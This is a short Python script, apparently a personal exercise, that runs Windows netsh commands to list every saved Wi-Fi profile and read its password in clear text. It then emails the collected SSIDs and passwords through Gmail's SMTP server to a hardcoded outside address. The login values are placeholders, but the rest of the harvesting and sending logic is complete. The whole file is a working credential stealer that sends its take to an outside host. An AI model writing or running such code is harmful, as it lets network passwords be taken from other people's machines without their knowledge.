'''
Author: Chris Wang
Date: 2021-02-27 08:45:29
LastEditors: your name
LastEditTime: 2021-02-27 10:15:51
Description: file content
'''

import subprocess
import re
import smtplib
from email.message import EmailMessage
# 这个是适应中文cmd的版本

# subprocess.run(['chcp','437']).stdout.decode()

# 模拟命令行中的操作，打印输出，进行观察，并进行捕获
command_output = subprocess.run(['netsh', 'wlan','show','profiles'], capture_output=True).stdout.decode('gbk') # 由于这个cmd是中文，所以这个gbk解码参数 是不得不加的

#从之前获取到的内容中，利用正则表达式得到需要的内容
# profile_names = (re.findall("All User Profile      : (.*)\r", command_output))
profile_names = (re.findall("所有用户配置文件 : (.*)\r", command_output))

wifi_list = list()


if len(profile_names) != 0 : # since i get some sth
    for name in profile_names:
        # 迭代处理每一个ssid
        # print(name)
        wifi_profile = dict() # 每一个 name都魏它创建一个字典来存储需要的信息

        # 继续调用指令去模拟获取cmd的信息
        try:
            profile_info = subprocess.run(['netsh','wlan','show','profile',name],capture_output=True).stdout.decode('gbk')
        except:
            continue
        # 利用正则表达式去找那些缺省的例子，这样可以直接跳过
        # if re.search("Security key           : Absent", profile_info):
        #     安全密钥               : 存在
        if re.search("安全密钥               : 不存在", profile_info):
            continue
        else:
            # 把ssid的信息存到字典中
            wifi_profile['ssid'] = name

            profile_info_pass = subprocess.run(['netsh','wlan','show','profile',name,'key=clear'], capture_output=True).stdout.decode('gbk') # 这里面subprocess的参数，例如key=clear不能加空格，反而会适得其反
            # print(profile_info_pass)
            
            password = re.search("关键内容            : (.*)\r", profile_info_pass)
            # print(password)
            if password == None:
                wifi_profile['password'] = None
            else:
                wifi_profile['password'] = password[1]
            
            wifi_list.append(wifi_profile)
else:
    print("none thing")

email_message = ""

if wifi_list:
    print("begin to send email!")
    for item in wifi_list:
        email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
    
    # create EmailMessage Object
    email = EmailMessage()
    # who is the email from

    email['from'] = "chris3will"
    email['to'] = 'chris3will@foxmail.com'
    
    # subject of the email
    email['subject'] = 'wifi things'

    email.set_content(email_message)

    # Create smtp server

    
    with smtplib.SMTP("smtp.gmail.com", port=587) as smtp: #需要把POP和IMAP打开
        smtp.ehlo()

        # Connect secruely to server
        smtp.starttls()

        smtp.login("@gmail.com","pwd")

        smtp.send_message(email)
    